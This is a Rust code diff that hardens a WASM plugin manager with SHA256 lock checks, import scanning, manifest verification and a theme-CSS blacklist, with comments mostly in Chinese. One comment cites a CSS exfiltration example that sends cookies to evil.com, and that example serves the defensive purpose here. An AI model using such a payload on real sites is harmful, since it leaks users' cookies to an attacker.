@@ -7,6 +7,7 @@ pub mod engines;
 pub mod entities;
 pub mod error;
 pub mod i18n;
+pub mod plugin_security;
 pub mod session;
 pub mod settings;
 pub mod utils;
@@ -99,6 +100,11 @@ pub struct PluginManager {
   /// 同 mtime 下永远返回同一 CSS，可以跨请求复用。
   /// 命中时省掉一次 wasmi instantiate + 调用 + memory I/O。
   theme_css_cache: Mutex<HashMap<PathBuf, (SystemTime, Arc<String>)>>,
+  /// Phase 9.2：插件 SHA256 lock 表。
+  /// key = 插件**文件名**（不是完整路径），value = 期望 SHA256 hex 小写。
+  /// 启动时由 app 从 `site.json` 灌入；加载时自动比对，不匹配则拒绝。
+  /// 空表 = warn-only 模式（fork 用户首次部署无 lock，先放行）。
+  plugins_lock: Mutex<HashMap<String, String>>,
   sandbox: SandboxConfig,
 }
 
@@ -119,8 +125,34 @@ impl PluginManager {
       linker,
       cache: Mutex::new(HashMap::new()),
       theme_css_cache: Mutex::new(HashMap::new()),
+      plugins_lock: Mutex::new(HashMap::new()),
       sandbox: SandboxConfig::from_env(),
     }
+  }
+
+  /// Phase 9.2：灌入插件 SHA256 lock 表。通常由 app 启动时从 `site.json`
+  /// 读取 [`crate::settings::SiteConfig::plugins_lock`] 调一次。
+  ///
+  /// 多次调用 = 完全替换（不合并）；空 map = 关闭 lock 校验（warn-only）。
+  ///
+  /// 仅在 `server` feature 下有效（sha2 依赖在 server 才启用）。
+  #[cfg(feature = "server")]
+  pub fn set_plugins_lock(&self, lock: HashMap<String, String>) {
+    if let Ok(mut guard) = self.plugins_lock.lock() {
+      *guard = lock;
+    }
+  }
+
+  /// Phase 9.2：查询路径对应文件名的 expected sha256（小写 hex）。
+  #[cfg(feature = "server")]
+  fn expected_sha256_for(&self, path: &Path) -> Option<String> {
+    let file_name = path.file_name()?.to_str()?;
+    self
+      .plugins_lock
+      .lock()
+      .ok()
+      .and_then(|guard| guard.get(file_name).cloned())
+      .filter(|s| !s.is_empty())
   }
 
   /// 当前 host 端输出缓冲上限（bytes）。用于上层 PluginEngine 决定结果 cap。
@@ -140,6 +172,10 @@ impl PluginManager {
 
   /// 从缓存中取出 wasm 路径对应的 `Module`；mtime 变化时会重新加载。
   /// 调用者传入实际 wasm 文件路径，有助于跨调用复用。
+  ///
+  /// Phase 9.2：首次加载时跑 [`plugin_security::scan_imports`]——
+  /// 当前宿主未暴露任何 host fn，任何 import 即拒。失败转为
+  /// `AppError::Plugin`，避免后续 instantiate 给出隐晦错误。
   pub fn get_or_load_module(&self, path: &Path) -> crate::error::AppResult<Module> {
     let mtime = std::fs::metadata(path)?.modified()?;
 
@@ -154,7 +190,30 @@ impl PluginManager {
 
     // 未命中 / mtime 变化 → 重新加载。读二进制 + 预编译
     let bytes = std::fs::read(path)?;
+
+    // Phase 9.2: SHA256 lock。site.json 有 lock 条目则比对；不匹配拒绝。
+    // 无条目 = warn-only（fork 用户首次部署允许）。
+    #[cfg(feature = "server")]
+    if let Some(expected) = self.expected_sha256_for(path) {
+      if let Err(detail) = plugin_security::verify_sha256(&bytes, &expected) {
+        return Err(crate::error::AppError::plugin(format!(
+          "plugin {} failed sha256 lock: {}",
+          path.display(),
+          detail
+        )));
+      }
+    }
+
     let module = Module::new(&self.engine, &bytes)?;
+
+    // Phase 9.2: import scan。任何 import 即拒（白名单 = ∅）。
+    if let Err(detail) = plugin_security::scan_imports(&module) {
+      return Err(crate::error::AppError::plugin(format!(
+        "plugin {} failed import scan: {}",
+        path.display(),
+        detail
+      )));
+    }
 
     // 写入缓存（错锁不阻塞调用，仅跳过本次缓存）
     if let Ok(mut cache) = self.cache.lock() {
@@ -291,6 +350,18 @@ impl PluginManager {
 
       // 缓存未命中 / mtime 不一致 → 调插件 + 写回 cache
       if let Ok(css) = self.call_path_with_string(path, "get_theme_css", "").await {
+        // Phase 9.2: theme CSS allowlist。命中黑名单 pattern 整段跳过 + warn。
+        // 防 CSS 注入做数据外渗（`url(http://evil.com/?cookie=...)` 之类）。
+        let hits = plugin_security::sanitize_theme_css(&css);
+        if !hits.is_empty() {
+          tracing::warn!(
+            target: "plugin_security",
+            plugin = %path.display(),
+            patterns = ?hits,
+            "theme CSS rejected: matched blacklist patterns"
+          );
+          continue;
+        }
         if let Some(mtime) = mtime {
           if let Ok(mut cache) = self.theme_css_cache.lock() {
             cache.insert(path.to_path_buf(), (mtime, Arc::new(css.clone())));
@@ -309,12 +380,17 @@ impl PluginManager {
   /// 实例化，确认它能在本宿主的 [`wasmi`] 引擎上运行且导出了 ABI 约定的
   /// `memory` / `alloc` / `dealloc`。校验本身也跑在 fuel + 内存限制 + timeout
   /// 之下，防止恶意 `start` 函数直接卡死上传流程。
+  ///
+  /// Phase 9.2：在 instantiate 前增加 import scan（白名单 = ∅），让上传链路
+  /// 第一时间拒绝有 host fn 依赖的非法插件。
   #[cfg(feature = "server")]
   pub async fn validate_plugin_bytes(&self, bytes: &[u8]) -> Result<(), String> {
     use std::time::Duration;
 
     let module = Module::new(&self.engine, bytes)
       .map_err(|e| format!("无法编译为合法 wasm 模块: {}", e))?;
+
+    plugin_security::scan_imports(&module).map_err(|e| format!("import 扫描拒绝: {}", e))?;
 
     let engine = self.engine.clone();
     let linker = self.linker.clone();
@@ -329,6 +405,60 @@ impl PluginManager {
       Ok(Ok(result)) => result,
       Ok(Err(e)) => Err(format!("校验线程异常: {}", e)),
       Err(_) => Err(format!("插件校验超时 ({}s)", sandbox.timeout_secs)),
+    }
+  }
+
+  /// Phase 9.2：对一段 wasm 字节跑完整安全检测（import scan + manifest
+  /// 一致性 + 可选 SHA256 比对），返回结构化报告。
+  ///
+  /// 用法：
+  /// - `admin_upload_plugin` 收到上传后立即调，hard failure 即拒绝
+  /// - `lock_plugins` CLI 跑一遍生成 site.json `plugins_lock` 字段
+  ///
+  /// 实例化检查（fuel / memory / timeout）走另一条路径
+  /// [`Self::validate_plugin_bytes`]，这里只做静态扫描。
+  #[cfg(feature = "server")]
+  pub async fn scan_uploaded_plugin(
+    &self,
+    bytes: &[u8],
+    expected_sha256: Option<&str>,
+  ) -> plugin_security::SecurityReport {
+    use plugin_security::SecurityReport;
+
+    let module_result = Module::new(&self.engine, bytes);
+
+    let (imports_ok, imports_detail) = match &module_result {
+      Ok(m) => match plugin_security::scan_imports(m) {
+        Ok(()) => (true, None),
+        Err(e) => (false, Some(e)),
+      },
+      Err(e) => (false, Some(format!("module decode failed: {}", e))),
+    };
+
+    let (manifest_ok, manifest_detail, manifest_extras) = match &module_result {
+      Ok(m) => match self.call_with_string(bytes, "get_manifest", "").await {
+        Ok(json) => match serde_json::from_str::<sdk::PluginManifest>(&json) {
+          Ok(manifest) => match plugin_security::verify_manifest_consistency(&manifest, m) {
+            Ok(extras) => (true, None, extras),
+            Err(detail) => (false, Some(detail), Vec::new()),
+          },
+          Err(e) => (false, Some(format!("manifest JSON 解析失败: {}", e)), Vec::new()),
+        },
+        Err(e) => (false, Some(format!("get_manifest 调用失败: {}", e)), Vec::new()),
+      },
+      Err(_) => (false, Some("wasm 解码失败，跳过 manifest 检查".into()), Vec::new()),
+    };
+
+    let sha256_status =
+      expected_sha256.map(|hex| plugin_security::verify_sha256(bytes, hex));
+
+    SecurityReport {
+      imports_ok,
+      imports_detail,
+      manifest_ok,
+      manifest_detail,
+      manifest_extras,
+      sha256_status,
     }
   }
 }
